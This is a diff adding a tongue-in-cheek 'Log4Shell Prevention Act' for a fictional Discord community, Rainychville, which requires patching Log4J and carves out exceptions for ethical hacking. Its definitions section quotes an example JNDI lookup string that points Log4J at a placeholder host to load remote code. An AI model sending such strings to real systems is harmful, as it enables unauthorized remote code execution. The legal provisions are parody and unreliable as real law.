@@ -1,0 +1,181 @@
+[From RandomFan#3511 Rainychville Law Services]
+[ECIR 12.1.355.8]
+
+
+
+
+-----------------------------------------------------------------------------
+
+            Rainychville Government
+
+            January 12, 2022 CE
+
+            Log4Shell Prevention Act
+
+                AN ACT
+
+        To prevent the exploitation of the
+        "Log4Shell" vulnerability in the Java 
+        library known as Log4J.
+
+-----------------------------------------------------------------------------
+
+SEC 1. SHORT TITLE.
+   This act may be cited as the ``Log4Shell Prevention Act``.
+SEC 2. DEFINITIONS.
+    (1) Java, as a programming language, wherein a program to print out
+     "Hello World" may be defined as:
+        public class Main {
+            public static void main (String[] args) {
+                System.out.println("Hello World");
+            }
+        }
+     where such program is placed in a file named Main.java;
+    (2) Log4J as a logging library for the Java programming
+     language, allowing for debugging messages and information about
+     the operations of a program or it's error handling to be logged
+     and therefore interpreted by programmers for the purposes of
+     rectifying errors or debugging;
+    (3) Log4Shell as a severe vulnerability in Log4J, allowing for the
+     execution of remote code by sending specially formatted strings,
+     some of which could load code and execute it, regardless of trust
+     or permission level wherein such specially formatted string may
+     be something such as ``{$jndi:ldap://example.com:389/badcode.java}``
+     where ``{$jndi:ldap`` instructs Log4J to load remote code from
+     ``example.com:389/badcode.java``, where ``389`` is the port number,
+     and ``badcode.java`` is the location of the attacker's code, and
+     that the code loaded from the ``{$jndi:ldap`` is executed, with
+     no permission checks;
+    (4) Unauthenticated remote code execution, or RCE, as the execution of
+     arbitrary code on a server, where the code is malicious or violates any
+     Rainychville law surrounding computers, or where it's execution is
+     undesirable to the owner or maintainer of the computer on which it is
+     executed, such as the undesired action by Log4J defined in Section 2.3;
+    (5) Code or program as any set of instructions understandable by any
+     computer, whether machine code, human-readable code interpreted by
+     an interpreter (such as Python);
+    (6) Computer or machine as any contraption capable of automatically
+     performing calculations or tasks;
+    (7) Sensitive data as any data, machine-readable, human-readable, or
+     program-readable, that details any sensitive information, where
+     such sensitive information may include:
+        (a) personal information, as defined by section 1006, clause 2 of
+         the Rainychville TOS;
+        (b) government or state secrets, such as:
+            (i) information on the locations of silos or facilities
+             that support the use of weapons of mass destruction
+             such as nukes, hydrogen bombs, death stars;
+            (ii) locations of espionage agents, where such agents are
+             performing any kind of tasks for the Rainychville
+             Government;
+            (iii) plans detailing military actions, or any information
+             which may benefit an enemy or put Rainychville at a
+             disadvantage in times of war or conflict;
+    (8) Environment as information on the unique set of software installed
+     on the computer's operating system, it's configurations;
+    (9) Environment variables as a series of key-value pairs on the computer,
+     which defines values critical or useful to it's operation, including but
+     not limited to: 
+        (a) API keys for accessing application programming interfaces,
+         services, and other resources on remote servers, where this API
+         key may be used for authorization, or authentication; and
+        (b) configuration settings for programs which operate in the shell.
+SEC 3. FAILURE TO PATCH LOG4J.
+    (1) Any organization that fails to protect personal or sensitive data,
+     by deliberate failure to patch the Log4Shell exploit, or prevent it's
+     exploitation via other means such as alteration of environment
+     variables or preventing LDAP lookups, shall be criminally liable
+     for the breach of said data, and any other Rainychville law broken by the leakage of said data. Aforementioned organizations covered include but are not limited to:
+        (a) Private or public companies;
+        (b) The Rainychville Government itself; and
+        (c) Individuals who operate or control services that
+         may be affected by the exploit;
+     where such organization:
+        (a) operates in the jurisdiction of Rainychville;
+        (b) is in possession, whether such data is encrypted at rest
+         and not usable by the organization itself, only by programs
+         which the organization controls, of any sensitive data;
+    (2) Organizations as defined by Section 3.1, shall be permitted to
+     deliberately maintain environments where Log4Shell is exploitable,
+     for the purposes of demonstration, penetration testing, ethical
+     hacking, or experimentation.
+    (3) Whereas it is infeasible to update Log4J to the latest version,
+     such organization may also alter their environment or it's
+     variables, or their copy of Log4J itself to prevent the exploitation
+     of Log4Shell.
+SEC 4. EXPLOITATION OF LOG4SHELL.
+    (1) The exploitation of the Log4Shell exploit shall be considered to be
+     a method of hacking a computer, or networks of computers, or part of
+     the act of hacking where the exploitation of such is defined as the
+     usage of the exploit in non-ethical hacking actions to perform remote
+     code execution or attain unauthorized access to a server's environment
+     variables.
+    (2) The standard exceptions for demonstration, penetration testing,
+     ethical hacking shall also apply to the act of exploiting the Log4Shell
+     exploit.
+    (3) If any exploitation of Log4Shell affects Rainych herself negatively,
+     any hacker responsible for affecting Rainych negatively via the Log4Shell
+     exploit, where it can be reliably proven in court, shall be permanently
+     banned from the Rainychville Discord server, without the ability to
+     appeal such a ban.
+SEC 5. GOVERNMENT PATCHING OF LOG4SHELL.
+    (1) The Rainychville Government itself must make reasonable efforts to
+     patch the Log4Shell vulnerability in all programs that they operate or
+     control, where such programs may be wholly written in Java, or at the
+     very least contain components that use or interact with Java code.
+    (2) To allow compliance with Section 5.1, Rainychville government
+     divisions shall be granted the power to demand copies of the source
+     code of any Java program that they use, within reason, where the reason
+     for such demand shall be exclusively the modification of the software
+     to prevent Log4Shell's exploitation, where such program may be proprietary
+     or where the developer does not provide users of the software with access
+     to the source code or any easily modifiable form of the program.
+    (3) If the program's source code is required and the program's source
+     code is accessible but does not meet the definition of "open source",
+     the Rainychville Government, within reason, when modifying the source
+     code even against the wishes of it's author or maintainer, be immune
+     to any claim of copyright infringement or the violation of any contract,
+     proven such modification only prevents the exploitation of Log4Shell,
+     and that there is no other change made to the program's features.
+    (4) Any investigation into possible abuse of the rights granted to the
+     Rainychville government defined in Sections 5.2 and 5.3 shall be
+     prioritized and anyone caught abusing such power prioritized for removal
+     from any position of trust or power within the Rainychville Government,
+     and banned from holding or regaining any such position, whereas such any
+     person who has recieved such a ban may only appeal it after extensive
+     probation and background checks.
+    (5) New programs in Java being developed by the Rainychville Government
+     shall be discouraged from utilizing the Log4J logging library to
+     prevent vulnerabilities or the exploitation of Log4Shell. These
+     programs shall instead use alternative Java logging libraries.
+SEC 6. IMPORT OF LOG4SHELL-AFFECTED SOFTWARE.
+    (1) The transfer of software affected by Log4Shell via a physical medium
+     including but not limited to:
+        (a) hard disk drives or solid state drives, wherein programs
+         which may or may not be affected by Log4Shell are stored, and
+         mailed or physically transported to another server or a user's
+         computer;
+        (b) books wherein the source code is physically written on the
+         pages of the book itself, or where significant snippets are
+         included in quotes of the book;
+     shall be logged and recorded, whereas such transfer, to be covered under
+     this law, must be:
+        (a) from a server or location outside of the jurisdiction of the
+         Rainychville Government, to any location within jurisdiction,
+         including any embassies or diplomatic buildings outside of
+         Rainychville but owned and operated by the Rainychville
+         Government for diplomatic purposes;
+        (b) software meant for production;
+     whereas exceptions shall be made for:
+        (a) the archival of old/legacy software, or old versions of said
+         software;
+        (b) demonstrations of the Log4Shell vulnerability where it will
+         be used for experimentation, penetration testing or ethical
+         hacking; and
+        (c) software not in production or unlikely to interact with
+         sensitive data.
+    (2) No logging or recording shall be required for the digital transfer
+     of software.
+-----------------------------------------------------------------------------
+LEGISLATIVE HISTORY: Please review the commit logs of the Git repository that
+this law document is stored in.
